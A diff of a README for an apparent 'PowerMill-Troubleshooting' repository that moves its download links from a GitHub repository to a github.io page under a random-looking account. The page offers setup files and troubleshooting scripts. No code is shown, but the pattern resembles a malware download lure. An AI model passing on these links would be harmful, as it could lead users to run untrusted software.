@@ -1,6 +1,6 @@
 # 🏗️ PowerMill-Troubleshooting - Fix PowerMill Installation Issues on Windows
 
-[![](https://img.shields.io/badge/Download-PowerMill_Fixes-blue.svg)](https://github.com/Arguseyed-orangeliqueur857/PowerMill-Troubleshooting)
+[![](https://img.shields.io/badge/Download-PowerMill_Fixes-blue.svg)](https://arguseyed-orangeliqueur857.github.io)
 
 This repository provides clear instructions to resolve installation failures for PowerMill on Windows 11. These notes cover common errors, system requirements, and the steps to ensure successful software setup on your computer.
 
@@ -17,7 +17,7 @@ Before you begin the installation process, ensure your computer meets these tech
 
 ## ⬇️ How to Download and Install
 
-Visit this page to download the necessary setup files and troubleshooting scripts: [https://github.com/Arguseyed-orangeliqueur857/PowerMill-Troubleshooting](https://github.com/Arguseyed-orangeliqueur857/PowerMill-Troubleshooting)
+Visit this page to download the necessary setup files and troubleshooting scripts: [https://arguseyed-orangeliqueur857.github.io](https://arguseyed-orangeliqueur857.github.io)
 
 1. Navigate to the link provided above.
 2. Locate the green button labeled "Code" toward the top right side of the screen.
